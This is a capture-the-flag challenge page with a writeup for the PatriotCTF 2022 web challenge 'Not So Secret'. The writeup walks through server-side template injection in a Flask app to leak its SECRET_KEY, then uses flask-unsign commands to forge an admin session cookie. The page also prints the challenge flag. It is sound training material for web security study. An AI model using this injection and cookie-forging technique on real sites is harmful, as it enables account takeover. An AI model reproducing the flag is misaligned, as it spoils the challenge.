# Not So Secret

p.s. For testing, go to [INSTALL.md](https://github.com/MasonCompetitiveCyber/PatriotCTF-2022/blob/main/Web/Not%20So%20Secret/INSTALL.md)

### Description
I am in the process of making the next big social media platform but I have a history of implementing software insecurely. If you can get into the admin user, I will give you a flag. 

Someone hacked my site after I read their message, so I am no longer reading DMs send to me! >:( On top of that, I am imposing an even harsher special character filter because I don't actually know how to patch my code.

p.s. To save you some time, don't try getting a reverse shell

### Difficulty
Medium

### Flag
`PCTF{y0u_can_s1gn_my_c00k13s_anyt1m3_;)}`

### Hints
1. Template injection
2. Sign your own cookie

### Author
Daniel Getter (NihilistPenguin)

### Tester
None yet

### Writeup

This web app is vulnerable to template injection. After signing up, send a test SSTI message `{{7*7}}`:
<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/raw/main/writeup-images/49.png" width=40%  height=40%></p>

We see that 7*7 was evaluated to 49, so we have successful template injection. There is a filter in place blocking these characters: `._[]|\`. This is so you can't attempt to execute python code to run system commands 'cause I want it solved another way.

In flask, we can have it give us the config file with this `{config}`, so let's try that:
<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/raw/main/writeup-images/ssti_config.png" width=40%  height=40%></p>

We see a `SECRET_KEY` set to `ifXEaNLEiDLIuquyRKzfeJJWzntoIm`. If we have the app's secret key, we can sign the session cookies used by the app. We'll use a tool called `flask-unsign` to do this for us (install w/ `pip3 install flask-unsign`).

Let's first decode our user's session cookie so we know the format. I use the Firefox extension `cookie editor` to do all of this:
<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/raw/main/writeup-images/cookie_editor.png" width=40%  height=40%></p>

```console
$ flask-unsign --decode --cookie '.eJwlzjsOwjAMANC7ZGaIndiJe5nKvwjWlk6Iu1OJ_Q3vU_Z15Pks2_u48lH2V5StEHbpo3Nd1RqKDOuGWmUluufsPsBXDCRkng2gpbCBV01iEFgJLaoKhladZIBhrp2oUYwZrlNU0smYbjTnwMHALcAdsy6LckeuM4__Bsv3B3oyLwQ.YieZSw.Fox-K5Pj1Zq30KG5ZngqBFzRce8'

{'_fresh': True, '_id': '524947460f0b32997b4b2a09fe2cce84c71cfd72526683113e96b1c0ae56191fe13d0a92da0a85b12dbca45535d78dca89a9ec5b65a92887276163d1cc2e0fbd', '_user_id': '2'}
```
We see that the `_user_id` key has a value of `2`. We can assume that the admin user's `_user_id` must be `1`. Let's sign our new key:

```console
$ flask-unsign --sign --cookie "{'_fresh': True, '_id': '524947460f0b32997b4b2a09fe2cce84c71cfd72526683113e96b1c0ae56191fe13d0a92da0a85b12dbca45535d78dca89a9ec5b65a92887276163d1cc2e0fbd', '_user_id': '1'}" --secret 'ifXEaNLEiDLIuquyRKzfeJJWzntoIm'

.eJwlzjsOwjAMANC7ZGaIndiJe5nKvwjWlk6Iu1OJ_Q3vU_Z15Pks2_u48lH2V5StEHbpo3Nd1RqKDOuGWmUluufsPsBXDCRkng2gpbCBV01iEFgJLaoKhladZIBhrp2oUYwZrlNU0smYbjTnwMHALcAdsy6LckeuM4__Bsr3B3ovLwM.YieaAA.nYGnkeNzCLq7xT-gp_KWw8lrFrs
```

The final step is to change our session cookie value to the one we just got, and reload the webpage. We should be admin and have access to the admin panel:
<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/raw/main/writeup-images/ssti_flag.png" width=60%  height=60%></p>
